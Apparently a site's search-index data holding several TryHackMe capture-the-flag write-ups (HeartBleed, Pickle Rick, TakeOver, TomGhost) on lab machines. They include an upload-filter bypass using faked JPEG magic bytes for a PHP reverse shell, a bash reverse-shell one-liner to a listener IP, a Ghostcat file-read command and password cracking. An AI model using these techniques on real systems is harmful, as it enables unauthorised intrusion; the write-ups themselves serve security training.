/register.php (Status: 200) [Size: 2346]  /upload.php (Status: 403) [Size: 0]\n</code></pre> <p>upload.php</p> <p> Now we can upload a reverse shell here but only jpg png so we have to do something about that\u00a0Let\u2019s first get a reserve shell and don\u2019t forget to change your ip and port in the reverse shell.</p> <p>I got the reverse shell from https://github.com/pentestmonkey/php-reverse-shell.git</p> <p>We can\u2019t yet upload the file. we have to modify it by adding (ff d8 ff e0) at the beginning of the file hex in order to get valid magic bytes. I used cyber chef to do this.</p> <p> Now we can upload this file you just need to export this file and it will be readen as a png file\u00a0now we will upload this file.</p> <p></p> <p></p> <p>Now open /api/uploads.</p> <p></p> <p>Get your listener ready and open the file.</p> <p> And we got in.</p> <p>Now go to /var/www /backup there you will find users.sql file.</p> <p> And got the admin\u2019s mail and also found a new subdomain.</p> <p> Again I added this to my host fileI was unable to visit so I again did a Nmap scan this time scanning all ports using -p- flag and\u00a0got a new port and added it as a port the page responded.</p> <p>And on visiting and putting in the admins\u2019 mail.</p> <p></p> <p> We got the final flag.</p> <p>Thank you for reading</p>"},{"location":"CTF/TryHackMe-HeartBleed/","title":"TryHackMe HeartBleed","text":"<p> <pre><code>TryhackMe Machine:- HeartBleed\nMachine Info:- SSL\nMachine Level:- Easy\n</code></pre></p> <p>Lab description</p> <p>Task 2 Protecting Data In Transit.</p> <p>In this task, you need to obtain a flag using a very well-known vulnerability. Make sure you pay attention to all the information and errors displayed. Pay particular attention to how web servers are configured.</p> <p>The server may take 3\u20134 minutes to deploy and configure. Please be patient.</p> <p>I started nmap scan.</p> <pre><code> nmap -sV --script vuln 34.255.10.109Starting Nmap 7.94 ( https://nmap.org ) at\n 2023-11-08 15:43 ISTPre-scan script results:| broadcast-avahi-dos:|   Discovered\n hosts:|     224.0.0.251|   After NULL UDP avahi packet DoS (CVE-2011-1002).|_  \n Hosts are all up (not vulnerable).Nmap scan report for ec2-34-255-10-109.\n eu-west-1.compute.amazonaws.com (34.255.10.109)Host is up (0.15s latency).Not \n shown: 995 closed tcp ports (conn-refused)PORT    STATE    SERVICE  VERSION22/\n tcp  open     ssh      OpenSSH 7.4 (protocol 2.0)| vulners:|   cpe:/\n a:openbsd:openssh:7.4:|      PRION:CVE-2019-6111 5.8 https://vulners.com/prion/\n PRION:CVE-2019-6111|      EXPLOITPACK:98FE96309F9524B8C84C508837551A19 5.8 \n https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19 \n *EXPLOIT*|      EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97 5.8 https://vulners.\n com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97 *EXPLOIT*|      \n EDB-ID:46516 5.8 https://vulners.com/exploitdb/EDB-ID:46516 *EXPLOIT*|      \n EDB-ID:46193 5.8 https://vulners.com/exploitdb/EDB-ID:46193 *EXPLOIT*|      \n CVE-2019-6111 5.8 https://vulners.com/cve/CVE-2019-6111|      1337DAY-ID-32328 5.\n 8 https://vulners.com/zdt/1337DAY-ID-32328 *EXPLOIT*|      1337DAY-ID-32009 5.8 \n https://vulners.com/zdt/1337DAY-ID-32009 *EXPLOIT*|      SSH_ENUM 5.0 https://\n vulners.com/canvas/SSH_ENUM *EXPLOIT*|      PRION:CVE-2018-15919 5.0 https://\n vulners.com/prion/PRION:CVE-2018-15919|      PRION:CVE-2018-15473 5.0 https://\n vulners.com/prion/PRION:CVE-2018-15473|      PRION:CVE-2017-15906 5.0 https://\n vulners.com/prion/PRION:CVE-2017-15906|      PACKETSTORM:150621 5.0 https://\n vulners.com/packetstorm/PACKETSTORM:150621 *EXPLOIT*|      \n EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0 5.0 https://vulners.com/exploitpack/\n EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0 *EXPLOIT*|      \n EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283 5.0 https://vulners.com/exploitpack/\n EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283 *EXPLOIT*|      EDB-ID:45939 5.0 \n https://vulners.com/exploitdb/EDB-ID:45939 *EXPLOIT*|      EDB-ID:45233 5.0 \n https://vulners.com/exploitdb/EDB-ID:45233 *EXPLOIT*|      CVE-2018-15919 5.0 \n https://vulners.com/cve/CVE-2018-15919|      CVE-2018-15473 5.0 https://vulners.\n com/cve/CVE-2018-15473|      CVE-2017-15906 5.0 https://vulners.com/cve/\n CVE-2017-15906|      1337DAY-ID-31730 5.0 https://vulners.com/zdt/\n 1337DAY-ID-31730 *EXPLOIT*|      PRION:CVE-2019-16905 4.4 https://vulners.com/\n prion/PRION:CVE-2019-16905|      CVE-2021-41617 4.4 https://vulners.com/cve/\n CVE-2021-41617|      CVE-2020-14145 4.3 https://vulners.com/cve/\n CVE-2020-14145|      PRION:CVE-2019-6110 4.0 https://vulners.com/prion/\n PRION:CVE-2019-6110|      PRION:CVE-2019-6109 4.0 https://vulners.com/prion/\n PRION:CVE-2019-6109|      CVE-2019-6110 4.0 https://vulners.com/cve/\n CVE-2019-6110|      CVE-2019-6109 4.0 https://vulners.com/cve/CVE-2019-6109|      \n PRION:CVE-2018-20685 2.6 https://vulners.com/prion/PRION:CVE-2018-20685|      \n CVE-2018-20685 2.6 https://vulners.com/cve/CVE-2018-20685|      \n PACKETSTORM:151227 0.0 https://vulners.com/packetstorm/PACKETSTORM:151227 \n *EXPLOIT*|      MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS- 0.0 https://vulners.com/\n metasploit/MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS- *EXPLOIT*|_     \n 1337DAY-ID-30937 0.0 https://vulners.com/zdt/1337DAY-ID-30937 *EXPLOIT*111/tcp \n open     rpcbind  2-4 (RPC #100000)| rpcinfo:|   program version    port/proto  \n service|   100000  2,3,4        111/tcp   rpcbind|   100000  2,3,4        111/\n udp   rpcbind|   100000  3,4          111/tcp6  rpcbind|   100000  3,4          \n 111/udp6  rpcbind|   100024  1          35465/tcp   status|   100024  1          \n 36511/udp   status|   100024  1          58279/tcp6  status|_  100024  1          \n 58851/udp6  status179/tcp filtered bgp443/tcp open     ssl/http nginx 1.15.7| \n ssl-ccs-injection:|   VULNERABLE:|   SSL/TLS MITM vulnerability (CCS \n Injection)|     State: VULNERABLE|     Risk factor: High|       OpenSSL before 0.\n 9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h|       does not properly \n restrict processing of ChangeCipherSpec messages,|       which allows \n man-in-the-middle attackers to trigger use of a zero|       length master key in \n certain OpenSSL-to-OpenSSL communications, and|       consequently hijack \n sessions or obtain sensitive information, via|       a crafted TLS handshake, aka \n the \"CCS Injection\" vulnerability.||     References:|       https://cve.mitre.org/\n cgi-bin/cvename.cgi?name=CVE-2014-0224|       http://www.openssl.org/news/\n secadv_20140605.txt|_      http://www.cvedetails.com/cve/2014-0224| \n http-vuln-cve2011-3192:|   VULNERABLE:|   Apache byterange filter DoS|     State: \n VULNERABLE|     IDs:  CVE:CVE-2011-3192  BID:49303|       The Apache web server \n is vulnerable to a denial of service attack when numerous|       overlapping byte \n ranges are requested.|     Disclosure date: 2011-08-19|     References:|       \n https://www.securityfocus.com/bid/49303|       https://www.tenable.com/plugins/\n nessus/55976|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192|\n _      https://seclists.org/fulldisclosure/2011/Aug/175| vulners:|   cpe:/\n a:igor_sysoev:nginx:1.15.7:|_     PRION:CVE-2018-16844 7.8 https://vulners.com/\n prion/PRION:CVE-2018-16844|_http-server-header: nginx/1.15.7|_http-csrf: Couldn't \n find any CSRF vulnerabilities.|_http-dombased-xss: Couldn't find any DOM based \n XSS.|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.| \n ssl-heartbleed:|   VULNERABLE:|   The Heartbleed Bug is a serious vulnerability \n in the popular OpenSSL cryptographic software library. It allows for stealing \n information intended to be protected by SSL/TLS encryption.|     State: \n VULNERABLE|     Risk factor: High|       OpenSSL versions 1.0.1 and 1.0.2-beta \n releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the \n Heartbleed bug. The bug allows for reading memory of systems protected by the \n vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted \n confidential information as well as the encryption keys themselves.||     \n References:|       http://www.openssl.org/news/secadv_20140407.txt|       https://\n cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160|_      http://cvedetails.com/\n cve/2014-0160/646/tcp filtered ldpService detection performed. Please report any \n incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host \n up) scanned in 151.60 seconds\n</code></pre> <p>So you will see alot of noice in the nmap scan but we will stick to the title and here we will use metasploit to exploit the vulnerablity.</p> <p></p> <p>We will use auxiliary/scanner/ssl/openssl_heartbleed.</p> <p>Now to use the auxiliary just enter  it will be automatically selected. <p>Now firstly set these parameters. RHOSTS [IP] Verbose True Set Action scan and then run the.</p> <p></p> <p>If you read this carefullly you will see the flag.</p> <p>Thank you for reading</p>"},{"location":"CTF/TryHackMe-Pickle-Rick/","title":"TryHackMe Pickle\u00a0Rick","text":"<pre><code>TryhackMe Machine:- Pickel Rick\nMachine Info:- Web\nMachine Level:- Easy\n</code></pre> <p>This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle.</p> <p>Deploy the virtual machine on this task and explore the web application: 10.10.237.59</p> <p>Started nmap scan.</p> <pre><code> nmap 10.10.237.59Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-06 21:24 ISTNmap scan report for 10.10.237.59Host is up (0.16s latency).Not shown: 998 closed tcp ports (conn-refused)PORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpNmap done: 1 IP address (1 host up) scanned in 40.93 seconds\n</code></pre> <p>Now ssh(22) and http(80) is open now i also perfromed directory brute force and found.</p> <pre><code>  _|. _ _  _  _  _ _|_    v0.4.3.post1 (_||| _) (/_(_|| (_| )Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25Wordlist size: 11460Output File: /Users/tanish/reports/_10.10.237.59/_23-11-06_21-25-14.txtTarget: http://10.10.237.59/[21:25:14] Starting:[21:25:24] 403 -  298B  - /.ht_wsr.txt[21:25:25] 403 -  301B  - /.htaccess.bak1[21:25:25] 403 -  301B  - /.htaccess.orig[21:25:25] 403 -  301B  - /.htaccess.save[21:25:25] 403 -  303B  - /.htaccess.sample[21:25:25] 403 -  299B  - /.htaccessOLD[21:25:25] 403 -  292B  - /.html[21:25:25] 403 -  302B  - /.htaccess_extra[21:25:25] 403 -  301B  - /.htaccess_orig[21:25:25] 403 -  299B  - /.htaccess_sc[21:25:25] 403 -  299B  - /.htaccessBAK[21:25:25] 403 -  300B  - /.htaccessOLD2[21:25:25] 403 -  291B  - /.htm[21:25:25] 403 -  301B  - /.htpasswd_test[21:25:25] 403 -  297B  - /.htpasswds[21:25:25] 403 -  298B  - /.httr-oauth[21:25:27] 403 -  292B  - /.php3[21:25:27] 403 -  291B  - /.php[21:25:53] 200 -  588B  - /assets/[21:25:53] 301 -  313B  - /assets  -&gt;  http://10.10.237.59/assets/[21:26:20] 200 -  455B  - /login.php[21:26:40] 200 -   17B  - /robots.txt[21:26:41] 403 -  301B  - /server-status/[21:26:41] 403 -  300B  - /server-statusTask Completed\n</code></pre> <p>Now /assets, /robots.txt and login.php and login.php are 200 ok so i visited them one by one first the main page.</p> <p></p> <p>Now on the i looked at the page source and found the username.</p> <p></p> <p>And on the assets i didnt find anything significant i visted the robots.txt and found the password for the username.</p> <p></p> <p>Now on logged in using the username and the password i got on /login.php</p> <p>And after login found command panel i tested it and a possible command injection.</p> <p></p> <p></p> <p>And yes it worked but it also disabled the commands.</p> <p></p> <p>So lets try to get a shell on this im using.</p> <pre><code>bash -c 'bash -i &gt;&amp; /dev/tcp/10.8.197.78/8081 0&gt;&amp;1'\n</code></pre> <p>And get your listener ready it pop a shell.</p> <p></p> <p>Got the first ingredient.</p> <p></p> <p>Now looked around and in /home/rick found the second file.</p> <p></p> <p>Now the to escalate privilege i found that the user www/data can exeute any sudo commands.</p> <p></p> <p>And found the 3rd ingredient too.</p> <p>Thank you for reading</p>"},{"location":"CTF/TryHackMe-TakeOver/","title":"TryHackMe TakeOver","text":"<pre><code>TryhackMe Machine:- Takeover\nMachine Info:- \nMachine Level:- Easy\n</code></pre> <p>Takeover is a free room in TryHackme it is a Web-based CTF, It is an easy room that focuses mainly on recon.</p> <p>as you start room you will be greeted with the message and 1 Task.</p> <pre><code>Hello there,    I am the CEO and one of the co-founders of futurevera.thm. \nIn Futurevera, we believe that the future is in space. We do a lot of space\nresearch and write blogs about it. We used to help students with space questions, \nbut we are rebuilding our support.  Recently blackhat hackers approached us saying \nthey could takeover and are asking us for a big ransom. Please help us to find \nwhat they can takeover. Our website is located at [https://futurevera.thm](https://\nfuturevera.thm/)Hint: Don't forget to add the 10.10.108.68 in /etc/hosts for \nfuturevera.thm ;)\n</code></pre> <p>Got the IP and started an Nmap scan.</p> <pre><code>nmap -sC -sV 10.10.54.233Starting Nmap 7.94 ( https://nmap.org ) at \n2023-10-22 00:17 ISTStats: 0:00:58 elapsed; 0 hosts completed (1 up), \n1 undergoing Script ScanNSE Timing: About 98.58% done; \nETC: 00:18 (0:00:00 remaining)Nmap scan report for 10.10.54.233\nHost is up (0.15s latency).Not shown: 997 closed tcp ports \n(conn-refused)PORT    STATE SERVICE  VERSION22/tcp  open  ssh\nOpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)|\nssh-hostkey:|   3072 dd:29:a7:0c:05:69:1f:f6:26:0a:d9:28:cd:40:f0:20 (RSA)|   \n256 cb:2e:a8:6d:03:66:e9:70:eb:96:e1:f5:ba:25:cb:4e (ECDSA)|_  256 \n50:d3:4b:a8:a2:4d:1d:79:e1:7d:ac:bb:ff:0b:24:13 (ED25519)80/tcp  open  http     \nApache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|\n_http-title: Did not follow redirect to https://futurevera.thm/443/tcp open  ssl/\nhttp Apache httpd 2.4.41 ((Ubuntu))|_ssl-date: TLS randomness does not represent \ntime| tls-alpn:|_  http/1.1| ssl-cert: Subject: commonName=futurevera.thm/\norganizationName=Futurevera/stateOrProvinceName=Oregon/countryName=US| Not valid \nbefore: 2022-03-13T10:05:19|_Not valid after:  2023-03-13T10:05:19|_http-title: \nFutureVera|_http-server-header: Apache/2.4.41 (Ubuntu)Service Info: OS: Linux; \nCPE: cpe:/o:linux:linux_kernelService detection performed. Please report any \nincorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) \nscanned in 65.61 seconds\n</code></pre> <p>So firstly added futurevera.thm to /etc/host and the IP.</p> <p></p> <p>And opened the URL.</p> <p></p> <p>And there was nothing on the web page it was a simple web pagealso, I started with subdomain enumeration using ffuf and found two subdomainsblog and support so I added them both to /etc/hosts.</p> <pre><code>ffuf -H  \"Host : FUZZ.futurevera.thm\" -u https://10.10.108.64 -w \n/Users/tanish/Documents/SecLists-master/Discovery/DNS\nbitquark-subdomains-top100000.txt -fs 0,4605 /'___\\  /'___\\ \n/'___\\       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \\ \\ ,__\\\n\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \n\\_/         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\          \\/_/    \\/\n_/   \\/___/    \\/_/       v2.1.\n0-dev________________________________________________ :: Method\n: GET :: URL              : https://10.10.108.64 :: Wordlist         \n: FUZZ: /Users/tanish/Documents/SecLists-master/Discovery/DNS/bitquark-subdomains-top100000.txt :: Header           : Host: \nFUZZ.futurevera.thm :: Follow redirects : false :: Calibration      \n: false :: Timeout          : 10 :: Threads          : 40 :: Matcher          \n: Response status: 200-299,301,302,307,401,403,405,500 :: Filter           \n: Response size: 0,\n4605________________________________________________blog                    \n[Status: 200, Size: 3838, Words: 1326, Lines: 81, Duration: 156ms]\nsupport                 [Status: 200, Size: 1522, Words: 367, Lines: 34, Duration: \n158ms]:: Progress: [120/100000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] \n:: Errors: 0 ::: Progress: [160/100000] :: Job [1/1] :: 0 req/sec :: Duration: \n[0:00:00] :: Errors: 0 ::: Progress: [200/100000] :: Job [1/1] :: 313 req/sec :: \nDuration: [0:00:01] :: Errors: 0\n</code></pre> <p>And again open the support.futurevera.thm and looked at the certificate i was able to see a DNS addressagain added it to /etc/hosts.</p> <p>Opened the URL and boom we got the flag.</p> <p></p> <p>Thank you for reading</p>"},{"location":"CTF/TryHackMe-TomGhost/","title":"TryHackMe TomGhost","text":"<pre><code>TryhackMe Machine:- Tomghost\nMachine Info:- (CVE-2020\u20131938)\nMachine Level:- Easy\n</code></pre> <p>This ctf mainly focuses on use of CVE 2020\u20131938 let\u2019s start by doing an nmap scan on the IP.</p> <p><pre><code>Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-29 18:26 ISTNmap scan \nreport for 10.10.59.201Host is up (0.15s latency).Not shown: 996 closed \ntcp ports (conn-refused)PORT     STATE SERVICE    VERSION22/tcp   open  ssh        \nOpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   2048 \nf3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)|   256 \ndd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)|_  256 \n48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)53/tcp   open  \ntcpwrapped8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)| ajp-methods:|_  \nSupported methods: GET HEAD POST OPTIONS8080/tcp open  http       Apache Tomcat 9.\n0.30|_http-title: Apache Tomcat/9.0.30|_http-favicon: Apache TomcatService Info: \nOS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please \nreport any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address \n(1 host up) scanned in 56.36 seconds\n</code></pre> Seeing the nmap scan result port 8009 tcp ajp13 apache jserv.</p> <p>First will check if the web page is accessable.</p> <p>I have used the CVE 2020 1938 or Ghostcat-CNVD-2020\u201310487.</p> <p>And yes it is reachable.</p> <pre><code>python3 ajpShooter.py http://10.10.59.201:8080 8009 /WEB-INF/web.xml read\n</code></pre> <p></p> <p>Okay so we have got a user name skyf\u2026 and something which looks like a password so lets try using it to ssh.</p> <p></p> <p>And we got in the server.</p> <p></p> <p>And we also got the first flag.</p> <p></p> <p>Also these two files tryhackme.asc and credential.pgp lets try to get this file.</p> <p></p> <p>And we got the file using scp.</p> <p>Also here i have to swtich to parrot os becoz for some gpg2john was not working.</p> <p></p> <p>Got the hash and carcked it using john and i got the password for merlin user lets try getting in vai ssh or just su user.</p> <p>Now using the password i cracked i used it to decrypt both tryhackme.asc and credential.gpg file.</p> <p>And got the password for merlin.</p> <p></p> <p>Now again logged in as merlin.</p> <p></p> <p>Now will do privilege escalation.</p> <p></p> <p>So the /usr/bin/zip is a root folder now went straight to gto-bin.</p> <p>found this</p> <p></p> <p>We got the root shell and the final flag.</p> <p></p> <p>Thank you for reading</p>"}]}